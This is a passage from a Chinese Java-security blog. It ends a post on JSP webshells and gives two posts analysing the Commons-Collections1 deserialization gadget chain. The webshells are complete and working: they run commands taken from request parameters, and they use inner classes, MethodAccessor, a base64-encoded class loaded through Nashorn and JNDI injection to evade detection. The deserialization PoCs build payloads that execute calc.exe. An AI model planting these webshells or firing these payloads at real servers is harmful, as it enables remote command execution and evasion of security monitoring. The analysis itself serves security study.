<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.security.CodeSource&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.security.cert.Certificate&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;jdk.nashorn.internal.runtime.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;jdk.nashorn.internal.runtime.options.Options&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.reflect.misc.MethodUtil&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell&lt;/h2&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  Class c = Class.forName(&quot;jdk.nashorn.internal.runtime.ScriptLoader&quot;);</span><br><span class="line">  final Constructor constructor = c.getDeclaredConstructor(Context.class);</span><br><span class="line">  constructor.setAccessible(true);</span><br><span class="line">  final Method m = c.getDeclaredMethod(&quot;installClass&quot;, String.class, byte[].class, CodeSource.class);</span><br><span class="line">  m.setAccessible(true);</span><br><span class="line">  class A &#123;</span><br><span class="line">    B b;</span><br><span class="line">    final class B &#123;</span><br><span class="line">      private Object o;</span><br><span class="line">      private Object[] oo;</span><br><span class="line"></span><br><span class="line">      public B() throws IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        o = constructor.newInstance(new Context(new Options(&quot;&quot;), null, null));</span><br><span class="line">        oo = new Object[]&#123;&quot;com.sec.test01.Test&quot;, Base64.getDecoder().decode(&quot;yv66vgAAADQAWgoAGQAsBwAtCgACACwKAC4ALwcAMAgAMQgAMgoALgAzCgA0ADUHADYIADcKAAoAOAcAOQoADQA6CgANADsKAAIAPAgAPQoAAgA+CgANAD8KAAoAPwoAQAA/CgA0AEEKAEIAPwcAQwcARAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARFdmFsAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBDBwAwBwAtBwBFBwBGBwA2BwA5AQAKRXhjZXB0aW9ucwcARwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMABoAGwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwBIDABJAEoBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDABLAEwHAEUMAE0ATgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIBAANHQksMABoATwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMABoAUAwAUQBSDABTAFQBAAEKDABVAFIMAFYAGwcARgwAVwBYBwBZAQATY29tL3NlYy90ZXN0MDEvVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEABWNsb3NlAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAUamF2YS9pby9PdXRwdXRTdHJlYW0AIQAYABkAAAAAAAIAAQAaABsAAQAcAAAAHQABAAEAAAAFKrcAAbEAAAABAB0AAAAGAAEAAAAIAAEAHgAfAAIAHAAAAOoABQAJAAAAeLsAAlm3AANNuAAEBr0ABVkDEgZTWQQSB1NZBStTtgAITi22AAk6BLsAClkZBBILtwAMOgW7AA1ZGQW3AA46BhkGtgAPWToHxgASLBkHtgAQEhG2ABBXp//pLLYAEjoIGQa2ABMZBbYAFBkEtgAVLbYAFrYAFxkIsAAAAAIAHQAAADYADQAAAAoACAALACEADAAnAA0ANAAOAD8AEABKABEAWQATAF8AFABkABUAaQAWAG4AFwB1ABgAIAAAACQAAv8APwAHBwAhBwAiBwAjBwAkBwAlBwAmBwAnAAD8ABkHACIAKAAAAAYAAgApACkAAQAqAAAAAgAr&quot;), new CodeSource(null, (Certificate[]) null)&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public A() throws IllegalAccessException, InstantiationException, InvocationTargetException &#123;</span><br><span class="line">      b = new B();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Class invokex(Method method)</span><br><span class="line">            throws InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">      return (Class) MethodUtil.invoke(method, b.o, b.oo);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Class target = new A().invokex(m);</span><br><span class="line">  Method eval = target.getDeclaredMethod(&quot;Eval&quot;, String.class);</span><br><span class="line">  Object cmd = eval.invoke(target.newInstance(), request.getParameter(&quot;cmd&quot;));</span><br><span class="line">  String s = cmd.toString();</span><br><span class="line">  out.println(s);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321162306296-1524479514.png" alt="image-20220321162306337"></p>
<h2 id="使用内部类"><a href="#使用内部类" class="headerlink" title="使用内部类"></a>使用内部类</h2><p>使用内部类绕过检测<code>java.lang.ProcessImpl</code>以及<code>invoke</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.reflect.misc.MethodUtil&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;java.lang.ProcessImpl JSP Webshell&lt;/h2&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  try &#123;</span><br><span class="line">    final String s = request.getParameter(&quot;threedr3am&quot;);</span><br><span class="line">    class A &#123;</span><br><span class="line"></span><br><span class="line">      B b;</span><br><span class="line"></span><br><span class="line">      final class B &#123;</span><br><span class="line"></span><br><span class="line">        private Method o;</span><br><span class="line">        private Object oo;</span><br><span class="line">        private Object[] ooo;</span><br><span class="line"></span><br><span class="line">        public B() throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">          Class clz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">          Method method = clz</span><br><span class="line">                  .getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class,</span><br><span class="line">                          ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">          method.setAccessible(true);</span><br><span class="line">          o = method;</span><br><span class="line">          oo = clz;</span><br><span class="line">          ooo = new Object[]&#123;s.split(&quot; &quot;), null, null, null, false&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      public A() throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        b = new B();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      public Object invokex()</span><br><span class="line">              throws InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        return MethodUtil.invoke(b.o, b.oo, b.ooo);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Process process = (Process) new A().invokex();</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">      stringBuilder.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (stringBuilder.length() &gt; 0) &#123;</span><br><span class="line">      response.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321163319503-767675441.png" alt="image-20220321163319663"></p>
<h2 id="使用MethodAccessor-invoke"><a href="#使用MethodAccessor-invoke" class="headerlink" title="使用MethodAccessor.invoke"></a>使用MethodAccessor.invoke</h2><p>如果检测了<code>Method.invoke</code>，就可以通过<code>MethodAccessor.invoke</code>绕过检测，核心代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());</span><br><span class="line">    MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);</span><br><span class="line">    Process process = (Process) methodAccessor.invoke(null, null);</span><br></pre></td></tr></table></figure>

<h2 id="使用JdbcRowSetImpl进行jndi注入"><a href="#使用JdbcRowSetImpl进行jndi注入" class="headerlink" title="使用JdbcRowSetImpl进行jndi注入"></a>使用JdbcRowSetImpl进行jndi注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;com.sun.rowset.JdbcRowSetImpl&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span><br><span class="line">JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="line">jdbcRowSet.setDataSourceName(request.getParameter(&quot;url&quot;));//ldap://localhost:port/Calc</span><br><span class="line">    try &#123;</span><br><span class="line">        jdbcRowSet.setAutoCommit(true);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        response.getOutputStream().write(e.getCause().getMessage().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/">https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons-Collections1分析（二）</title>
    <url>/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p>
<span id="more"></span>

<p>下面为完整的调用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br></pre></td></tr></table></figure>

<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p>
<p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure>

<p>而<code>LazyMap</code>的触发点是在get()方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p>
<p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>运行完get()方法弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p>
<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p>
<p>所有的注解类型都继承自Annotation接口</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p>
<p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" alt="image-20220425004347242"></p>
<p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class  clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>

<p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p>
<p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p>
<p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons-Collections1分析（三）</title>
    <url>/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="cc链的另一种构造方式"><a href="#cc链的另一种构造方式" class="headerlink" title="cc链的另一种构造方式"></a>cc链的另一种构造方式</h3><p>接着上篇的分析，上文中讲到<code>LazyMap</code>通过<code>get()</code>方法可以达到利用链触发命令执行</p>
<span id="more"></span>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100217366-1661900816.png" alt="image-20220425100216545"></p>
<p>根据<code>get()</code>方法克制，根据传入的key进行判断，如果map中不包含此key，就会通过<code>factory</code>调用<code>transform()</code>方法，这里的<code>factory</code>是可以通过构造方法进行赋值的，那么这里可以将<code>factory</code>的值赋值为<code>ChainedTransformers</code>,就可以触发后面的调用链完成命令执行。但可以看到<code>LazyMap</code>的构造方法是被<code>protected</code>关键词修饰的，是无法直接进行new创建的，</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100840761-1896569264.png" alt="image-20220425100840057"></p>
<p>查找其他函数时，发现<code>decorate()</code>方法可以完成<code>factory</code>的赋值。这也是为什么在前面的POC里面我们调用该方法并传入<code>innerMap</code>和<code>transformerChain</code>参数。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101040851-1566624004.png" alt="image-20220425101040219"></p>
<p>这里传入的<code>innerMap</code>为为一个Map集合，<code>transformerChain</code>为一个被<code>ChainedTransformer</code>修饰过的<code>Transformer[]</code>数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>

<p>调试分析，首先进入<code>decorate()</code>方法，完成<code>factory</code>的赋值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101914918-253951094.png" alt="image-20220425101914180"></p>
<p>下一步进入get()方法，调用<code>transform()</code>方法，后续就是循环调用<code>Transformer#transform</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425102027194-2090880442.png" alt="image-20220425102026291"></p>
<p>上面是我们测试的POC的调用过程，但在实际利用中，如何让它调用到我们的<code>get()</code>方法呢，在上篇中<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法会调用<code>get()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180003976-1607958223.png" alt="image-20220425180002813"></p>
<p>根据构造方法传入第⼀个参数是⼀个<code>Annotation</code>类类型参数，该类是注解类，第二个是map类型参数，这个参数可以传<code>LazyMap</code>类型的对象去调用<code>get()</code>方法，<code>get()</code>方法调用<code>transform()</code>,</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180049855-1977873704.png" alt="image-20220425180049496"></p>
<p>怎么去调用<code>AnnotationInvocationHandler</code>的<code>invoke</code></p>
<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        Class clazz =</span><br><span class="line">                Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;1.txt&quot;));</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下这行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>

<p>这里的<code>handler</code>是反射创建的一个 <code>AnnotationInvocationHandler</code>类。而<code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>接口，可以直接作为调用处理器传入。在poc执行反序列化时，由于<code>AnnotationInvocationHandler</code>重写了<code>readObject()</code>方法，并且<code>readObject()</code>方法会调用<code>memberValues.entrySet().iterator()</code>，这里的<code>memberValues</code>即为被代理类<code>LazyMap</code>，通过构造方法传入并赋值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426000620806-1633479758.png" alt="image-20220426000617958"></p>
<p>在下面代理对象是<code>proxyMap</code>，当调用<code>proxyMap</code>的<code>entrySet()</code>会触发到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法进行执行。这也是动态代理的一个特性，代理对象调用任意方法，调用处理器中的<code>invoke()</code>方法都会执行一次。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure>

<p>所以接下来就会执行<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，接着调用<code>LazyMap#get()</code>触发后面的利用链</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003833650-887299424.png" alt="image-20220426003829666"></p>
<p>进入<code>get()</code>方法，如下，后面就和之前的利用过程一致了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003854700-2086954144.png" alt="image-20220426003853411"></p>
<p>完整的利用链如下</p>
